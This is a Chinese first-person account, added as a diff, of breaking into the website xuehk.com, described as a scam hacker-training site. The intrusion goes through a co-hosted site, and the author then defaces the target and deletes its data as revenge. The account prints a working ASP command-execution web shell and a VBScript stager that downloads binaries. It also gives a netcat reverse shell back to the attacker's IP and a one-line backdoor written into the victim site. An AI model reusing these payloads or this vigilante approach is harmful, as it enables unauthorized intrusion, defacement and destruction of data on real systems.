@@ -1,0 +1,129 @@
+
+入侵骗子站xuehk.com全过程
+
+黑客培训机构骗了钱，而且骗取的金额数目可不少。
+
+准备对这个所谓的黑客培训机构进行一次渗透。在网上搜索了一些关于这个网站的资料，
+
+得知，这个网站在前不久已经被人黑过了，如果现在还要再次入侵的话，成功的几率可能比小，
+
+于是就叫上了几个朋友一起搞。
+
+http://www.xuehk.com  发现网站的页面几乎都是静态的，
+
+整理好思路后，我决定先从主站入手。用阿D和明小子注入工具进行了一次注入点扫面，结果无功而返，
+
+但这是我意料之中的事。然后，我变了一下思路，搜集齐了的目录，
+
+分别用网站猎手和明小子注入工具的批量扫描功能对这些目录进行后台扫描，
+
+然后我又用我自己加强过的NBSI一个一个的扫，结果依然是无功而返。
+
+看来从主站入手是几乎没可能的了，于是乎开始旁注。
+
+http://www.114best.com/ip/对xuehk进行旁注查询，发现服务器上有很多网站，
+
+很快我就找到了一个有漏洞的网站，如但是由于服务器安装了比较强的杀软，所以我只拿到了一个一句webshell
+
+把webshell丢给朋友后，我用lake2的一句话木马客户端查看了一下服务器信息，
+
+webshell所在的网站根目录为“F:\wwwroot\****\wwwroot\”，****为网站域名的前段，
+
+我推测xuehk.com的网站根目录为“F:\wwwroot\xuehk\wwwroot\”，于是我马上尝试跳转到此目录，但是没有权限。
+
+这时我想到asp.net的木马权限可能会比asp的高一点，但是上传好lake2的asp.net一句话木马后却发现服务器不支持asp.net。
+
+接着查看了一下终端信息，发现端口被改为了60015。
+
+查看了一下第三方软件的信息，结果serv-u路径找不到，而且默认密码改了，
+
+服务器上没有安装PcanyWhere和Radmin，MSSQL和Mysql也没有安装，仔细再找了一下，
+
+也没有发现什么可利用的第三方软件，而且服务器的权限设置得很死，连“开始→程序”都打不开。
+
+上传cmd.asp准备尝试执行命令，但cmd.asp也被服务器的杀毒软件给kill了，于是，自己操刀写了个执行cmd命令的asp脚本
+
+代码如下：
+
+<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
+<%if err then%>
+<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
+<%
+end if
+response.write("<textarea readonly cols=80 rows=20>")
+On Error Resume Next
+response.write oScriptlhn.exec("cmd.exe /c" & request("c")).stdout.readall
+response.write("</textarea>")
+response.write("<form method='post'>")
+response.write("<input type=text name='c' size=60><br>")
+response.write("<input type=submit value='执行'></form>")
+%>
+
+成功上传到服务器后，执行cmd.asp命令失败。我想可能是管理员删除了cmd.exe，
+
+也可能是服务器的权限设置问题，用一句话木马查看服务器服务信息发现Wscript并没有被禁止，
+
+本想用Wscript来执行命令，但是连一些能写的目录都找不到，常用的everyone目录都不能用，至此，提权陷入了死局。
+
+找了N个小时，终于找到了一个能写的目录，目录位置是“C:\Program Files\free3web~”，
+
+这着实吓了我一跳，一个软件的目录居然能写？打开这个目录看了看，不知道是什么东西，就搁在了一边。
+
+准备把cmd上传到服务器的时候我又发现了一个问题，就是我该如何把二进制文件传上服务器呢？
+
+一句话木马只支持文本上传。有的朋友可能说用Wget.vbs来下载，
+
+我们该怎么执行命令让Wget.vbs去下载文件呢？经过一会儿的思考，我终于想到了一个办法，不能上传，但能下载吧？
+
+于是我在网上找到了一个可行的办法，就是利用Microsoft.XMLHTTP来下载文件到服务器上。我们先把cmd.exe传上自己的网站上（
+
+然后打开一句话木马客户端增强版，填好一句话木马的信息后，把第三个框清空，再把第二个框的代码换成：
+
+Set xPost = CreateObject("Microsoft.XMLHTTP")
+xPost.Open "GET","被下载文件的网址",False
+xPost.Send()
+Set sGet = CreateObject("ADODB.Stream")
+sGet.Mode = 3
+sGet.Type = 1
+sGet.Open()
+sGet.Write(xPost.responseBody)
+sGet.SaveToFile Server.MapPath("保存的文件名"),2
+set sGet = nothing
+set sPOST = nothing
+response.Write("下载成功！")
+
+再点击“GO”按钮后，一会儿文件就会被下载到服务器上了
+
+上传好cmd.exe后，在我刚才写的cmd.asp脚本的代码中把
+
+cmd.exe 改为“C:\Program Files\free3web~\cmd.exe”，
+
+尝试着执行了一下命令，发现执行成功！看来不需要用Wscript来执行命令
+
+用dir命令想查看F盘的文件，但是没有权限，能执行命令但又没有利用价值，
+
+.得知用nc反弹回来的shell权限是比webshell权限高的！
+
+于是我马上弄了一个我免杀过的nc到服务器上，
+
+在本地打开cmd，输入命令  nc -vv -l -p 2006，
+
+在webshell中输入c:\Program~\freeweb\nc.exe -e c:\Program~\freeweb\cmd.exe 我的IP 2006
+
+一会儿nc就有回应了，我尝试用命令“dir F:\wwwroot\xuehk\wwwroot\”的时候，
+
+居然成功的列出了xuehk.com网站的所有文件，
+
+然后我试着用echo命令来在xuehk.com写一个文件，输入“echo H4cked by 落叶纷飞>luoye.txt”，
+
+现在来echo一个一句话木马吧！
+
+输入“echo ^<script language=VBScript runat=server^>execute request^("l"^)^</script^>>luoye.asp”，
+
+成功写入luoye.asp，但因为服务器屏蔽了asp调试错误的信息，所以打开luoye.asp时返回的页面是500内部错误，
+
+但是这并不影响一句话木马的使用，我用lake2的一句话木马客户端连接上xuehk.com的一句话木马后，
+
+用它的“Edit TextFile”功能把xuehk.com的首页文件index.asp替换成了黑页，
+
+并且在nc反弹回来的shell中将其数据完全删除掉了，也算是给他们一个小小的教训吧！总的来说，这次入侵的目的还是达到了。
